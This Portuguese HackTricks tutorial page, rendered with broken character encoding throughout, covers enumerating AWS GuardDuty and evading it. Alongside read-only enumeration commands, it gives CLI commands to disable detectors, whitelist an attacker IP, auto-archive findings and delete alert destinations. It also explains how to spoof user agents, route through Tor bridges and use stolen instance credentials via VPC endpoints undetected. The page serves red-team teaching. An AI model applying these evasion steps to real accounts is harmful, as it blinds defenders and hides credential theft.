# AWS - GuardDuty Enum

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## GuardDuty

De acordo com a [**documenta√ß√£o**](https://aws.amazon.com/guardduty/features/): GuardDuty combina **aprendizado de m√°quina, detec√ß√£o de anomalias, monitoramento de rede e descoberta de arquivos maliciosos**, utilizando tanto fontes da AWS quanto de terceiros l√≠deres do setor para ajudar a proteger cargas de trabalho e dados no AWS. GuardDuty √© capaz de analisar dezenas de bilh√µes de eventos em v√°rias fontes de dados da AWS, como logs de eventos do AWS CloudTrail, logs de fluxo do Amazon Virtual Private Cloud (VPC), logs de auditoria e de sistema do Amazon Elastic Kubernetes Service (EKS) e logs de consultas DNS.

O Amazon GuardDuty **identifica atividades incomuns dentro de suas contas**, analisa a **relev√¢ncia de seguran√ßa** da atividade e fornece o **contexto** no qual foi invocada. Isso permite que um respondente determine se deve gastar tempo em uma investiga√ß√£o mais aprofundada.

Alertas **aparecem no console do GuardDuty (90 dias)** e nos Eventos do CloudWatch.

{% hint style="warning" %}
Quando um usu√°rio **desativa o GuardDuty**, ele para de monitorar seu ambiente AWS e n√£o gerar√° novas descobertas, e as **descobertas existentes ser√£o perdidas**.\
Se voc√™ apenas par√°-lo, as descobertas existentes permanecer√£o.
{% endhint %}

### Exemplo de Descobertas

* **Reconhecimento**: Atividade sugerindo reconhecimento por um atacante, como **atividade incomum de API**, tentativas suspeitas de **login** em banco de dados, **varredura de portas** intra-VPC, padr√µes incomuns de tentativas de login mal-sucedidas ou sondagem de portas n√£o bloqueadas por um IP mal-intencionado conhecido.
* **Comprometimento de inst√¢ncia**: Atividade indicando comprometimento de uma inst√¢ncia, como **minera√ß√£o de criptomoedas, comando e controle de backdoor (C\&C)**, malware usando algoritmos de gera√ß√£o de dom√≠nio (DGA), atividade de nega√ß√£o de servi√ßo de sa√≠da, volume de tr√°fego de rede **anormalmente alto**, protocolos de rede incomuns, comunica√ß√£o de sa√≠da da inst√¢ncia com um IP malicioso conhecido, credenciais tempor√°rias do Amazon EC2 usadas por um endere√ßo IP externo e exfiltra√ß√£o de dados usando DNS.
* **Comprometimento de conta**: Padr√µes comuns indicativos de comprometimento de conta incluem chamadas de API de uma geolocaliza√ß√£o incomum ou proxy anonimizador, tentativas de desativar o registro do AWS CloudTrail, altera√ß√µes que enfraquecem a pol√≠tica de senha da conta, lan√ßamentos incomuns de inst√¢ncia ou infraestrutura, implanta√ß√µes de infraestrutura em uma regi√£o incomum, roubo de credenciais, atividade suspeita de login em banco de dados e chamadas de API de endere√ßos IP maliciosos conhecidos.
* **Comprometimento de bucket**: Atividade indicando comprometimento de um bucket, como padr√µes de acesso a dados suspeitos indicando uso indevido de credenciais, atividade incomum da API Amazon S3 de um host remoto, acesso n√£o autorizado ao S3 de endere√ßos IP maliciosos conhecidos e chamadas de API para recuperar dados em buckets S3 de um usu√°rio sem hist√≥rico pr√©vio de acesso ao bucket ou invocado de uma localiza√ß√£o incomum. O Amazon GuardDuty monitora e analisa continuamente eventos de dados do S3 do AWS CloudTrail (por exemplo, GetObject, ListObjects, DeleteObject) para detectar atividades suspeitas em todos os seus buckets Amazon S3.

<details>

<summary>Informa√ß√µes sobre Descobertas</summary>

Resumo da descoberta:

* Tipo de descoberta
* Gravidade: 7-8.9 Alta, 4-6.9 M√©dia, 01-3.9 Baixa
* Regi√£o
* ID da conta
* ID do recurso
* Hora da detec√ß√£o
* Qual lista de amea√ßas foi usada

O corpo tem estas informa√ß√µes:

* Recurso afetado
* A√ß√£o
* Ator: Endere√ßo IP, porta e dom√≠nio
* Informa√ß√µes adicionais

</details>

### Todas as Descobertas

Acesse a lista de todas as descobertas do GuardDuty em: [https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-active.html](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-active.html)

### Contas M√∫ltiplas

#### Por Convite

Voc√™ pode **convidar outras contas** para uma conta AWS GuardDuty diferente, de modo que **cada conta seja monitorada a partir do mesmo GuardDuty**. A conta principal deve convidar as contas membros e ent√£o o representante da conta membro deve aceitar o convite.

#### Via Organiza√ß√£o

Voc√™ pode designar qualquer conta dentro da organiza√ß√£o para ser o **administrador delegado do GuardDuty**. Apenas a conta de gerenciamento da organiza√ß√£o pode designar um administrador delegado.

Uma conta que √© designada como administrador delegado torna-se uma conta administradora do GuardDuty, tem o GuardDuty ativado automaticamente na regi√£o designada e tamb√©m tem a **permiss√£o para ativar e gerenciar o GuardDuty para todas as contas da organiza√ß√£o dentro dessa Regi√£o**. As outras contas na organiza√ß√£o podem ser visualizadas e adicionadas como contas membros do GuardDuty associadas a essa conta administradora delegada.

## Enumera√ß√£o

{% code overflow="wrap" %}
```bash
# Get Org config
aws guardduty list-organization-admin-accounts #Get Delegated Administrator
aws guardduty describe-organization-configuration --detector-id <id>

# Check external invitations
aws guardduty list-invitations
aws guardduty get-invitations-count

# Detector Information
aws guardduty list-detectors # 1 detector per account with GuardDuty
aws guardduty get-detector --detector-id <id> # Get detector info
aws guardduty get-master-account --detector-id <id>

# Get filters
aws guardduty list-filters --detector-id <id> # Check filters
aws guardduty get-filter --detector-id <id> --filter-name <name>

# Findings
aws guardduty list-findings --detector-id <id> # List findings
aws guardduty get-findings --detector-id <id> --finding-ids <id> # Get details about the finding
aws guardduty get-findings-statistics --detector-id <id> --finding-statistic-types <types>

# Get trusted IP addresses
aws guardduty list-ip-sets --detector-id <id>
aws guardduty get-ip-set --detector-id <id>

# Member accounts of the current AWS GuardDuty master account
aws guardduty list-members --detector-id <id>
aws guardduty get-members --detector-id <id> --account-ids <id>
aws guardduty get-member-detectors --detector-id <id> --account-ids <id>

# Continuously export its findings to an Amazon S3 bucket
aws guardduty list-publishing-destinations --detector-id <id>

# Intelligence sets that you have uploaded to GuardDuty
aws guardduty list-threat-intel-sets --detector-id <id>
aws guardduty get-threat-intel-set --detector-id <id> --threat-intel-set-id <id>
```
{% endcode %}

## Bypass do GuardDuty

### Orienta√ß√µes Gerais

Tente descobrir o m√°ximo poss√≠vel sobre o comportamento das credenciais que voc√™ vai usar:

* Hor√°rios de uso
* Localiza√ß√µes
* User Agents / Servi√ßos (Pode ser usado de awscli, webconsole, lambda...)
* Permiss√µes regularmente usadas

Com essa informa√ß√£o, recrie o m√°ximo poss√≠vel o mesmo cen√°rio para usar o acesso:

* Se for um **usu√°rio ou uma fun√ß√£o acessada por um usu√°rio**, tente usar nos mesmos hor√°rios, da mesma geolocaliza√ß√£o (at√© mesmo o mesmo ISP e IP se poss√≠vel)
* Se for uma **fun√ß√£o usada por um servi√ßo**, crie o mesmo servi√ßo na mesma regi√£o e use-o de l√° nos mesmos intervalos de tempo
* Sempre tente usar as **mesmas permiss√µes** que este principal usou
* Se voc√™ precisar **usar outras permiss√µes ou abusar de uma permiss√£o** (por exemplo, baixar 1.000.000 de arquivos de log do cloudtrail) fa√ßa isso **lentamente** e com o **m√≠nimo de intera√ß√µes** com a AWS (awscli √†s vezes chama v√°rias APIs de leitura antes da de escrita)

### Modificar o GuardDuty

#### `guardduty:ListDetectors`, `guardduty:UpdateDetector`

Com essas permiss√µes, voc√™ poderia desativar o GuardDuty para evitar o acionamento de alertas.
```bash
# Disabling the detector
aws guardduty update-detector \
--detector-id <detector-id> \
--no-enable

# Removing s3 as a log source
aws guardduty update-detector \
--detector-id <detector-id> \
--data-sources S3Logs={Enable=false}

# Increase finding update time to 6 hours
aws guardduty update-detector \
--detector-id <detector-id> \
--finding-publishing-frequency SIX_HOURS
```
#### `guardduty:ListDetectors`, `guardduty:ListIPSet`, `iam:PutRolePolicy`, (`guardduty:CreateIPSet`|`guardduty:UpdateIPSet`)

Um atacante poderia criar ou atualizar a [Lista de IPs Confi√°veis](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_upload-lists.html) do GuardDuty, incluindo **seu pr√≥prio IP na lista**. Quaisquer IPs em uma lista de IPs confi√°veis **n√£o ter√£o alertas de Cloudtrail ou VPC flow log acionados** contra eles.

{% hint style="info" %}
Os achados de DNS s√£o isentos da Lista de IPs Confi√°veis.
{% endhint %}
```bash
aws guardduty update-ip-set \
--detector-id <detector-id> \
--ip-set-id 24adjigdk34290840348exampleiplist \
--location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \
--activate
```
{% hint style="info" %}
Dependendo do n√≠vel de discri√ß√£o necess√°rio, o **arquivo pode ser carregado em um bucket s3 na conta alvo, ou em uma conta controlada pelo atacante.**
{% endhint %}

#### `guardduty:CreateFilter`

Novas descobertas do GuardDuty podem ser automaticamente arquivadas atrav√©s de [Regras de Supress√£o](https://docs.aws.amazon.com/guardduty/latest/ug/findings_suppression-rule.html). Um advers√°rio poderia **usar** [**filtros**](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_filter-findings.html) **para arquivar automaticamente descobertas** que provavelmente ir√£o gerar.

Filtros podem ser criados usando a [API CreateFilter](https://docs.aws.amazon.com/guardduty/latest/APIReference/API_CreateFilter.html).
```bash
aws guardduty create-filter \
--action ARCHIVE \
--detector-id <detector-id> \
--name yourfiltername \
--finding-criteria file://criteria.json
```
#### `guardduty:DeletePublishingDestination`

Um advers√°rio poderia desativar alertas simplesmente [deletando o destino](https://docs.aws.amazon.com/cli/latest/reference/guardduty/delete-publishing-destination.html) dos alertas.
```bash
aws guardduty delete-publishing-destination \
--detector-id <detector-id> \
--destination-id def456
```
{% hint style="danger" %}
Excluir este destino de publica√ß√£o **n√£o afetar√° a gera√ß√£o ou visibilidade de descobertas dentro do console do GuardDuty**. O GuardDuty continuar√° a analisar eventos no seu ambiente AWS, identificar comportamentos suspeitos ou inesperados e gerar descobertas.
{% endhint %}

### Bypass de Descobertas Espec√≠ficas

#### Descobertas de Pentest

O GuardDuty do OS detecta solicita√ß√µes da API AWS de ferramentas comuns de pentesting e dispara uma [Descoberta de Pentest](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#pentest-iam-kalilinux).\
√â detectado pelo **nome do agente de usu√°rio** que √© passado na solicita√ß√£o da API.\
Portanto, **modificar o agente de usu√°rio** √© poss√≠vel para prevenir que o GuardDuty detecte o ataque.

Usar OS como Ubuntu, Mac ou Windows evitar√° que este alerta seja acionado.

Para prevenir isso, voc√™ pode procurar pelo script `session.py` no pacote `botocore`. No Kali Linux, est√° em `/usr/local/lib/python3.7/dist-packages/botocore/session.py`.

Por volta da linha [456](https://github.com/boto/botocore/blob/7de36c07ecec503f588ac27658b1795e83b67b75/botocore/session.py#L456), voc√™ deve ver `platform.system()` e `platform.release()`. Substitua este **c√≥digo por strings de agente de usu√°rio leg√≠timas como as encontradas em** [**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/user\_agents.txt).

#### Descobertas de Cliente Tor

{% hint style="success" %}
A maneira mais f√°cil de contornar isso √© simplesmente **n√£o usar Tor para se conectar √† AWS** (por que voc√™ estaria usando Tor se quer permanecer furtivo e simular o cen√°rio de credenciais comprometidas?)
{% endhint %}

Se voc√™ fizer uma conex√£o a partir do **Tor**, o **Guarduty** definir√° o alerta [**UnauthorizedAccess:EC2/TorClient**](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-ec2.html#unauthorizedaccess-ec2-torclient)**.**

O Guarduty detecta isso gra√ßas a uma [lista p√∫blica de n√≥s Tor](https://metrics.torproject.org/exonerator.html).&#x20;

Se voc√™ precisar se conectar atrav√©s do Tor, pode **contornar isso usando** [**Bridges**](https://community.torproject.org/relay/types-of-relays/#Bridge). Mas obviamente seria melhor se voc√™ simplesmente n√£o usasse Tor para se conectar.

Para usar uma bridge, voc√™ pode usar [Obfs4](https://gitlab.com/yawning/obfs4) (`apt install tor obfs4proxy`) e obter um endere√ßo de bridge de [bridges.torproject.org](https://bridges.torproject.org/options).

A partir daqui, `crie um arquivo torrc` com algo semelhante a:
```
UseBridges 1
Bridge obfs4 <IP ADDRESS>:<PORT> <FINGERPRINT> cert=<cert_string> iat-mode=0
ClientTransportPlugin obfs4 exec /bin/obfs4proxy
```
Execute `tor -f torrc` e voc√™ poder√° se conectar ao proxy socks5 regular na porta 9050.

#### Detec√ß√£o de Exfiltra√ß√£o de Credenciais

Se voc√™ **roubar credenciais EC2** do servi√ßo de metadados e us√°-las **fora da infraestrutura AWS**, o alerta [UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationoutsideaws) √© acionado.

Al√©m disso, se voc√™ **usar sua pr√≥pria inst√¢ncia EC2** para utilizar as **credenciais roubadas**, o alerta [UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationinsideaws) √© acionado.

{% hint style="warning" %}
Se voc√™ **comprometer** outra m√°quina **EC2** da **mesma conta**, poder√° usar as credenciais l√° e **nenhum alerta** ser√° gerado.
{% endhint %}

No entanto, atualmente existe um bypass funcional para isso - [VPC Endpoints](https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html). Usar **VPC Endpoints** **n√£o acionar√° o alerta do GuardDuty**. Isso significa que, como atacante, `se voc√™ roubar credenciais IAM de uma inst√¢ncia EC2, poder√° usar essas credenciais de sua pr√≥pria inst√¢ncia EC2 enquanto direciona o tr√°fego atrav√©s de VPC Endpoints. Isso n√£o acionar√° a detec√ß√£o do GuardDuty`.

A ferramenta [**SneakyEndpoints**](https://github.com/Frichetten/SneakyEndpoints) foi criada para automatizar esse processo. Este projeto **inicia um ambiente para ataque via Terraform**. Ele criar√° uma inst√¢ncia EC2 em uma sub-rede privada sem acesso √† internet e criar√° v√°rios VPC Endpoints para voc√™ usar.

**Outra maneira de burlar este alerta** √© simplesmente usar credenciais roubadas na mesma m√°quina de onde foram roubadas **ou em uma da mesma conta.**

## Refer√™ncias

* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/)
* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/)
* [https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/](https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/)
* [https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/](https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
